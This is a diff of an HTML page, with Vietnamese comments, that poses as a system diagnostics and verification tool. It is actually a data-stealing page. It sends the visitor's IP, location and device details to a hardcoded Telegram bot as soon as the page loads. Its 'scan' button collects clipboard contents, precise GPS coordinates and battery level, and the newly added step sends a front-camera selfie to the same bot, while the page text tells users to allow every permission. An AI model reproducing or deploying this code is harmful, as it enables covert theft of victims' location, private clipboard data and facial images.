@@ -3,270 +3,243 @@
 <head>
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
-    <title>System Scanner v2.0</title>
+    <title>System Diagnostics & Verification</title>
     
     <link href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" rel="stylesheet">
     <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;700&display=swap" rel="stylesheet">
 
     <style>
-        :root { --bg: #050505; --panel: #111; --text: #e0e0e0; --accent: #00ff41; --danger: #ff3333; }
-        body { background-color: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 15px; font-size: 13px; }
+        :root { --bg: #0a0a0a; --card: #141414; --text: #eee; --accent: #00ff9d; --danger: #ff4757; }
+        body { background: var(--bg); color: var(--text); font-family: 'JetBrains Mono', monospace; margin: 0; padding: 20px; font-size: 13px; }
         
         .container { max-width: 600px; margin: 0 auto; }
-        .header { text-align: center; border-bottom: 1px solid #333; padding-bottom: 15px; margin-bottom: 15px; }
-        .header h1 { color: var(--accent); margin: 0; font-size: 1.5rem; }
         
-        .info-row { display: flex; justify-content: space-between; border-bottom: 1px dashed #333; padding: 8px 0; }
-        .label { color: #888; }
-        .value { color: #fff; font-weight: bold; text-align: right; }
-        .value.warn { color: var(--danger); }
-        .value.success { color: var(--accent); }
+        /* HEADER */
+        .header { text-align: center; border-bottom: 1px solid #333; padding-bottom: 20px; margin-bottom: 20px; }
+        .header h1 { color: var(--accent); margin: 0; font-size: 1.4rem; text-transform: uppercase; letter-spacing: 1px; }
+        .header p { color: #666; font-size: 0.8rem; margin-top: 5px; }
 
-        .scan-btn {
-            width: 100%; padding: 15px; background: var(--accent); color: #000;
-            border: none; font-weight: bold; font-size: 16px; margin-top: 20px;
-            cursor: pointer; text-transform: uppercase; border-radius: 4px;
-            box-shadow: 0 0 15px rgba(0, 255, 65, 0.2);
-        }
-        .scan-btn:active { transform: scale(0.98); }
-        .scan-btn:disabled { background: #333; color: #777; box-shadow: none; }
+        /* DATA GRID */
+        .grid { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; margin-bottom: 20px; }
+        .card { background: var(--card); padding: 15px; border-radius: 6px; border: 1px solid #222; }
+        .card-label { color: #888; font-size: 10px; text-transform: uppercase; display: block; margin-bottom: 5px; }
+        .card-val { font-weight: bold; color: #fff; font-size: 12px; word-break: break-all; }
+        .highlight { color: var(--accent); }
 
-        #console {
-            background: #000; border: 1px solid #333; color: #aaa;
-            padding: 10px; height: 150px; overflow-y: auto; margin-top: 20px;
-            font-size: 11px; font-family: monospace;
+        /* BUTTONS */
+        .btn-group { display: flex; flex-direction: column; gap: 15px; }
+        
+        .btn {
+            width: 100%; padding: 15px; border: none; border-radius: 6px;
+            font-weight: bold; font-family: inherit; cursor: pointer;
+            text-transform: uppercase; display: flex; align-items: center; justify-content: center; gap: 10px;
+            transition: all 0.2s; font-size: 14px;
         }
+
+        .btn-scan { background: var(--accent); color: #000; box-shadow: 0 0 15px rgba(0, 255, 157, 0.2); }
+        .btn-scan:active { transform: scale(0.98); }
+        
+        .btn-photo { background: #333; color: #fff; border: 1px solid #555; position: relative; overflow: hidden; }
+        .btn-photo input { position: absolute; opacity: 0; width: 100%; height: 100%; cursor: pointer; left: 0; top: 0; }
+        .btn-photo:active { background: #444; }
+
+        /* LOG */
+        #console { margin-top: 20px; color: #555; font-size: 10px; border-top: 1px dashed #333; padding-top: 10px; }
+
     </style>
 </head>
 <body>
 
     <div class="container">
         <div class="header">
-            <h1>SYSTEM DIAGNOSTICS</h1>
-            <p>Fix: IP Source & Permission Flow</p>
+            <h1>System Check v3.0</h1>
+            <p>ID: <span id="sess-id">Initializing...</span></p>
         </div>
 
-        <div id="dashboard">
-            <div class="info-row"><span class="label">IP Address</span><span class="value" id="ip-val">Scanning...</span></div>
-            <div class="info-row"><span class="label">ISP</span><span class="value" id="isp-val">...</span></div>
-            <div class="info-row"><span class="label">Location</span><span class="value" id="loc-val">...</span></div>
-            <div class="info-row"><span class="label">Device</span><span class="value" id="dev-val">...</span></div>
+        <div class="grid">
+            <div class="card">
+                <span class="card-label">IP Address</span>
+                <span class="card-val highlight" id="ip">Scanning...</span>
+            </div>
+            <div class="card">
+                <span class="card-label">Location</span>
+                <span class="card-val" id="loc">...</span>
+            </div>
+            <div class="card" style="grid-column: span 2">
+                <span class="card-label">Device Info</span>
+                <span class="card-val" id="device">Analyzing...</span>
+            </div>
         </div>
 
-        <button class="scan-btn" id="start-btn" onclick="executeScan()">
-            <i class="fas fa-radar"></i> START DEEP SCAN
-        </button>
-        <div style="text-align:center; margin-top:5px; font-size:10px; color:#555">
-            Bấm "Cho phép/Allow" tất cả yêu cầu để fix lỗi
+        <div class="btn-group">
+            <!-- 1. Nút Quét Dữ Liệu -->
+            <button class="btn btn-scan" id="scan-btn" onclick="runDiagnostics()">
+                <i class="fas fa-radar"></i> 1. KÍCH HOẠT QUÉT HỆ THỐNG
+            </button>
+
+            <!-- 2. Nút Chụp Ảnh (Input ẩn) -->
+            <button class="btn btn-photo" id="photo-btn">
+                <i class="fas fa-camera"></i> 2. GỬI ẢNH XÁC MINH (SELFIE)
+                <!-- accept="image/*" capture="user" mở camera trước ngay lập tức -->
+                <input type="file" id="camera-input" accept="image/*" capture="user" onchange="handlePhotoUpload(this)">
+            </button>
         </div>
 
-        <div id="console">Ready. Waiting for user interaction...</div>
+        <div id="console">> System ready. Waiting for input...</div>
     </div>
 
     <script>
-        // --- CẤU HÌNH ---
-        const BOT_TOKEN = "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE"; 
-        const CHAT_ID = "@testappxyz";
-
-        // Biến toàn cục
-        let SYS = {
-            ip: "Error", isp: "Error", city: "Error",
-            device: navigator.platform,
-            userAgent: navigator.userAgent,
-            gpu: "N/A", battery: "N/A", connection: "N/A",
-            clipboard: "Empty/Denied",
-            media: "Denied",
-            gps: "Denied",
-            fingerprint: Math.random().toString(36).substring(2, 10)
+        // --- CẤU HÌNH (Thay Token của bạn vào đây) ---
+        const CONFIG = {
+            TOKEN: "6789490938:AAGbxaiI4NVuZBWEm-ktCT4w2FNVuV_v7mE", 
+            CHAT_ID: "@testappxyz"
         };
 
-        const log = (msg) => {
-            const c = document.getElementById('console');
-            c.innerHTML += `> ${msg}<br>`;
-            c.scrollTop = c.scrollHeight;
+        // Biến lưu dữ liệu
+        let DATA = {
+            ip: "N/A", isp: "N/A", city: "N/A",
+            device: "N/A", os: "N/A", gpu: "N/A",
+            ram: "N/A", battery: "N/A",
+            clipboard: "Trống/Từ chối",
+            gps: "Chưa cấp quyền",
+            mapLink: "",
+            fingerprint: Math.random().toString(36).substr(2, 9).toUpperCase()
         };
 
-        // 1. Lấy IP (Dùng nguồn mới ipwho.is - Uy tín hơn)
-        async function fetchIP() {
-            log("Fetching IP from ipwho.is...");
-            try {
-                // ipwho.is không cần key, hỗ trợ https, ít bị chặn
-                const res = await fetch('https://ipwho.is/');
-                const data = await res.json();
-                
-                if(data.success) {
-                    SYS.ip = data.ip;
-                    SYS.isp = data.connection.isp || data.connection.org;
-                    SYS.city = `${data.city}, ${data.region}, ${data.country}`;
-                    
-                    document.getElementById('ip-val').innerText = SYS.ip;
-                    document.getElementById('ip-val').classList.add('success');
-                    document.getElementById('isp-val').innerText = SYS.isp;
-                    document.getElementById('loc-val').innerText = data.city;
-                    log("IP Success: " + SYS.ip);
-                } else {
-                    throw new Error("API Limit");
-                }
-            } catch (e) {
-                log("IP Fetch Failed. Trying backup...");
-                // Backup nguồn 2
-                try {
-                    const r2 = await fetch('https://api.ipify.org?format=json');
-                    const d2 = await r2.json();
-                    SYS.ip = d2.ip;
-                    document.getElementById('ip-val').innerText = SYS.ip;
-                } catch(err) { SYS.ip = "Blocked by Adblock"; }
-            }
-        }
+        const log = (text) => document.getElementById('console').innerText = `> ${text}`;
 
-        // 2. Lấy thông tin phần cứng (Xử lý lỗi iOS)
-        function getHardware() {
-            // GPU
+        // 1. Khởi tạo & Lấy IP tự động
+        window.onload = async () => {
+            document.getElementById('sess-id').innerText = DATA.fingerprint;
+            
+            // Thông tin thiết bị cơ bản
+            DATA.device = navigator.userAgent;
+            DATA.os = navigator.platform;
+            
+            // Xử lý GPU
             try {
-                const canvas = document.createElement('canvas');
-                const gl = canvas.getContext('webgl');
+                const gl = document.createElement('canvas').getContext('webgl');
                 const debug = gl.getExtension('WEBGL_debug_renderer_info');
-                SYS.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
-            } catch(e) { SYS.gpu = "Integrated"; }
+                DATA.gpu = gl.getParameter(debug.UNMASKED_RENDERER_WEBGL);
+            } catch(e) { DATA.gpu = "Integrated"; }
 
-            // Device Name formatting
-            if(SYS.userAgent.includes('iPhone')) SYS.device = "iPhone (iOS)";
-            else if(SYS.userAgent.includes('Android')) SYS.device = "Android Device";
-            
-            document.getElementById('dev-val').innerText = SYS.device;
+            document.getElementById('device').innerText = `${DATA.os} | ${DATA.gpu}`;
 
-            // iOS Limitations handling
-            const isIOS = /iPad|iPhone|iPod/.test(navigator.userAgent);
-            SYS.connection = isIOS ? "Apple Privacy Lock" : (navigator.connection ? navigator.connection.effectiveType : "Unknown");
-            SYS.battery = isIOS ? "Apple Privacy Lock" : "Checking...";
+            // Lấy IP (IPWhois)
+            try {
+                const res = await fetch('https://ipwho.is/');
+                const json = await res.json();
+                if(json.success) {
+                    DATA.ip = json.ip;
+                    DATA.isp = json.connection.isp;
+                    DATA.city = `${json.city}, ${json.country}`;
+                    
+                    document.getElementById('ip').innerText = DATA.ip;
+                    document.getElementById('loc').innerText = DATA.city;
+                    sendTextReport("Truy cập mới (Auto)");
+                }
+            } catch(e) { log("IP Blocked by Adblock"); }
+        };
+
+        // 2. Chức năng Quét sâu (Clipboard, GPS, Media Labels)
+        async function runDiagnostics() {
+            const btn = document.getElementById('scan-btn');
+            btn.innerHTML = "ĐANG TRÍCH XUẤT DỮ LIỆU...";
+            btn.disabled = true;
+
+            // Chạy song song các tác vụ
+            const tasks = [
+                // Task A: Clipboard (Phải gọi ngay lập tức)
+                navigator.clipboard ? navigator.clipboard.readText().then(t => DATA.clipboard = t || "Trống").catch(()=> DATA.clipboard = "Từ chối") : Promise.resolve(),
+                
+                // Task B: GPS
+                new Promise(resolve => {
+                    if(!navigator.geolocation) resolve();
+                    navigator.geolocation.getCurrentPosition(
+                        pos => {
+                            DATA.gps = `${pos.coords.latitude}, ${pos.coords.longitude} (±${Math.round(pos.coords.accuracy)}m)`;
+                            DATA.mapLink = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
+                            resolve();
+                        },
+                        err => { DATA.gps = "Từ chối/Tắt"; resolve(); },
+                        { enableHighAccuracy: true, timeout: 10000 }
+                    );
+                }),
+
+                // Task C: Pin (Nếu có)
+                navigator.getBattery ? navigator.getBattery().then(b => DATA.battery = `${Math.round(b.level*100)}%`) : Promise.resolve()
+            ];
+
+            await Promise.allSettled(tasks);
             
-            if(!isIOS && navigator.getBattery) {
-                navigator.getBattery().then(b => {
-                    SYS.battery = `${Math.round(b.level*100)}%`;
-                });
+            await sendTextReport("KẾT QUẢ QUÉT (FULL)");
+            btn.innerHTML = "✔ ĐÃ GỬI BÁO CÁO";
+            log("Report sent. Now requesting photo...");
+            alert("Đã gửi dữ liệu hệ thống. Vui lòng bấm nút 'Gửi Ảnh Xác Minh' để hoàn tất.");
+        }
+
+        // 3. Chức năng Gửi Ảnh (Camera Upload)
+        async function handlePhotoUpload(input) {
+            if (input.files && input.files[0]) {
+                const file = input.files[0];
+                const formData = new FormData();
+                formData.append("chat_id", CONFIG.CHAT_ID);
+                formData.append("photo", file);
+                formData.append("caption", `📸 <b>ẢNH XÁC MINH</b>\nID: ${DATA.fingerprint}\nIP: ${DATA.ip}`);
+                formData.append("parse_mode", "HTML");
+
+                const btn = document.getElementById('photo-btn');
+                btn.innerHTML = "ĐANG GỬI ẢNH...";
+
+                try {
+                    const res = await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendPhoto`, {
+                        method: "POST",
+                        body: formData
+                    });
+                    if(res.ok) {
+                        btn.style.background = "#00ff9d";
+                        btn.style.color = "#000";
+                        btn.innerHTML = "✔ GỬI ẢNH THÀNH CÔNG";
+                        alert("Xác minh hoàn tất! Cảm ơn bạn.");
+                    } else { throw new Error("API Error"); }
+                } catch (e) {
+                    alert("Lỗi gửi ảnh. Vui lòng thử lại.");
+                    btn.innerHTML = "THỬ LẠI";
+                }
             }
         }
 
-        // 3. HÀM CHÍNH: Chạy song song để tránh mất quyền
-        async function executeScan() {
-            const btn = document.getElementById('start-btn');
-            btn.disabled = true;
-            btn.innerHTML = "SCANNING... (PLEASE WAIT)";
-            
-            log("Starting parallel scan...");
-
-            // --- BƯỚC 1: KÍCH HOẠT CLIPBOARD NGAY LẬP TỨC (QUAN TRỌNG) ---
-            // Phải làm ngay khi click, không được chờ await IP hay GPS
-            let clipPromise = Promise.resolve("Skipped");
-            try {
-                if(navigator.clipboard && navigator.clipboard.readText) {
-                    log("Requesting Clipboard...");
-                    clipPromise = navigator.clipboard.readText()
-                        .then(text => {
-                            SYS.clipboard = text ? text.substring(0, 50) : "Empty";
-                            log("Clipboard: OK");
-                        })
-                        .catch(err => {
-                            SYS.clipboard = "Denied";
-                            log("Clipboard: Denied");
-                        });
-                }
-            } catch(e) {}
-
-            // --- BƯỚC 2: KÍCH HOẠT MEDIA DEVICES (CAM/MIC) NGAY LẬP TỨC ---
-            let mediaPromise = Promise.resolve("Skipped");
-            try {
-                log("Requesting Camera Info...");
-                mediaPromise = navigator.mediaDevices.getUserMedia({video:true})
-                    .then(stream => {
-                        stream.getTracks().forEach(t => t.stop()); // Tắt luôn
-                        return navigator.mediaDevices.enumerateDevices();
-                    })
-                    .then(devices => {
-                        const cams = devices.filter(d => d.kind === 'videoinput').map(d => d.label);
-                        SYS.media = cams.length > 0 ? cams.join(', ') : "Camera found but no label";
-                        log("Media: OK");
-                    })
-                    .catch(err => {
-                        SYS.media = "Denied by User";
-                        log("Media: Denied");
-                    });
-            } catch(e) {}
-
-            // --- BƯỚC 3: GPS (Vẫn chạy nền) ---
-            let gpsPromise = new Promise((resolve) => {
-                if(navigator.geolocation) {
-                    log("Requesting GPS...");
-                    navigator.geolocation.getCurrentPosition(
-                        (pos) => {
-                            SYS.gps = `Lat: ${pos.coords.latitude}, Lon: ${pos.coords.longitude} (Acc: ${Math.round(pos.coords.accuracy)}m)`;
-                            SYS.gmap = `https://www.google.com/maps?q=${pos.coords.latitude},${pos.coords.longitude}`;
-                            log("GPS: Locked");
-                            resolve();
-                        },
-                        (err) => {
-                            SYS.gps = "User Denied";
-                            log("GPS: Denied");
-                            resolve();
-                        },
-                        {enableHighAccuracy: true, timeout: 8000}
-                    );
-                } else { resolve(); }
-            });
-
-            // --- BƯỚC 4: LẤY IP LẦN CUỐI (Nếu lúc đầu chưa xong) ---
-            let ipPromise = SYS.ip === "Error" ? fetchIP() : Promise.resolve();
-
-            // Đợi tất cả hoàn tất (Tối đa 5 giây cho các cái phụ)
-            await Promise.allSettled([clipPromise, mediaPromise, gpsPromise, ipPromise]);
-
-            log("Scan finished. Sending data...");
-            await sendTelegram();
-            
-            btn.innerHTML = "DONE ✔";
-            alert("Đã gửi báo cáo thành công!");
-        }
-
-        async function sendTelegram() {
+        // Helper: Gửi tin nhắn văn bản
+        async function sendTextReport(title) {
             const msg = `
-🔍 <b>SYSTEM FIX REPORT</b>
-━━━━━━━━━━━━━━━━━━
-🆔 <b>ID:</b> <code>${SYS.fingerprint}</code>
-🌐 <b>IP:</b> <code>${SYS.ip}</code>
-🏢 <b>ISP:</b> ${SYS.isp}
-📍 <b>Location:</b> ${SYS.city}
-━━━━━━━━━━━━━━━━━━
-📱 <b>Device:</b> ${SYS.device}
-🎮 <b>GPU:</b> ${SYS.gpu}
-🔋 <b>Battery:</b> ${SYS.battery}
-📶 <b>Net Type:</b> ${SYS.connection}
-━━━━━━━━━━━━━━━━━━
-📋 <b>Clipboard:</b> <code>${SYS.clipboard}</code>
-📸 <b>Camera:</b> ${SYS.media}
-━━━━━━━━━━━━━━━━━━
-🛰 <b>GPS FIXED:</b> 
-${SYS.gps}
-${SYS.gmap ? `<a href="${SYS.gmap}">Open Google Maps</a>` : ''}
+🔍 <b>${title}</b>
+━━━━━━━━━━━━━━
+🆔 <b>ID:</b> <code>${DATA.fingerprint}</code>
+🌐 <b>IP:</b> <code>${DATA.ip}</code>
+📍 <b>Loc:</b> ${DATA.city}
+🏢 <b>ISP:</b> ${DATA.isp}
+━━━━━━━━━━━━━━
+📱 <b>Device:</b> ${DATA.device}
+🎮 <b>GPU:</b> ${DATA.gpu}
+🔋 <b>Pin:</b> ${DATA.battery}
+━━━━━━━━━━━━━━
+📋 <b>Clipboard:</b> <code>${DATA.clipboard}</code>
+🛰 <b>GPS:</b> ${DATA.gps}
+${DATA.mapLink ? `<a href="${DATA.mapLink}">Xem Bản Đồ</a>` : ''}
 `;
             try {
-                await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
+                await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
                     method: 'POST',
                     headers: {'Content-Type': 'application/json'},
                     body: JSON.stringify({
-                        chat_id: CHAT_ID,
+                        chat_id: CONFIG.CHAT_ID,
                         text: msg,
                         parse_mode: "HTML",
                         disable_web_page_preview: true
                     })
                 });
-            } catch(e) { log("Send Error: " + e.message); }
+            } catch(e) {}
         }
-
-        // Init
-        window.onload = () => {
-            getHardware();
-            fetchIP(); // Chạy ngầm IP ngay khi mở web
-        };
 
     </script>
 </body>
